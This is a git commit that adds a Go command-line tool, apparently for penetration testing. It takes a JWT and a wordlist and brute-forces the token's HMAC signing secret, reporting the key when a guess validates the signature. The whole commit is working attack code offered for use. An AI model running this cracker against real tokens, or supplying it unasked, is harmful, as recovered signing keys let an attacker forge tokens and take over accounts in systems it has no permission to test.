b1623fabc90820eeda56a2d18493ca18bca8993d
nicollas.lopes <nicollaslopesn@gmail.com>
2025-12-10 07:42:47 -0300

    feat: add jwt weak secret

---
+++ main.go
@@ -0,0 +1,87 @@
+package main
+
+import (
+	"bufio"
+	"flag"
+	"fmt"
+	"log"
+	"os"
+	"time"
+
+	"github.com/golang-jwt/jwt/v5"
+)
+
+var Red = "\033[31m"
+var Magenta = "\033[35m"
+var Green = "\033[32m"
+var Yellow = "\033[33m"
+var EndColor = "\033[0m"
+var BrightBlue = "\x1b[94m"
+var BrightCyan = "\x1b[96m"
+
+var verbosePtr *bool
+
+func validateSignature(tokenString string, secretKey []byte) bool {
+
+	token, _ := jwt.Parse(tokenString, func(t *jwt.Token) (interface{}, error) {
+		if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
+			return nil, fmt.Errorf("unexpected signing method: %v", t.Header["alg"])
+		}
+		return secretKey, nil
+	})
+
+	if token.Valid {
+		fmt.Printf("%v\n[✔] Secret Key Found! %v %v %v %v\n", Green, EndColor, Yellow, string(secretKey), EndColor)
+		return true
+	}
+
+	return false
+}
+
+func bruteForce(wordlistPath string, jwt string) {
+
+	file, err := os.Open(wordlistPath)
+	if err != nil {
+		log.Fatalf("Error opening file: %v", err)
+	}
+
+	defer file.Close()
+
+	start := time.Now()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+
+		if *verbosePtr {
+			word := scanner.Text()
+			if len(word) > 20 {
+				word = word[:20] + "..."
+			}
+			fmt.Printf("\r\033[K%vTesting: %v %s", Red, EndColor, word)
+		}
+
+		if validateSignature(jwt, []byte(scanner.Text())) {
+			duration := time.Since(start).Seconds()
+			fmt.Printf("Finished in %.2f seconds.\n\n", duration)
+			return
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		log.Fatal(err)
+	}
+}
+
+func main() {
+
+	var jwtToken string
+
+	verbosePtr = flag.Bool("v", false, "verbose mode")
+	pathToWordlist := flag.String("w", "", "path to wordlist")
+	flag.Parse()
+
+	fmt.Println("Enter JWT Token: ")
+	fmt.Scanln(&jwtToken)
+
+	bruteForce(*pathToWordlist, jwtToken)
+}
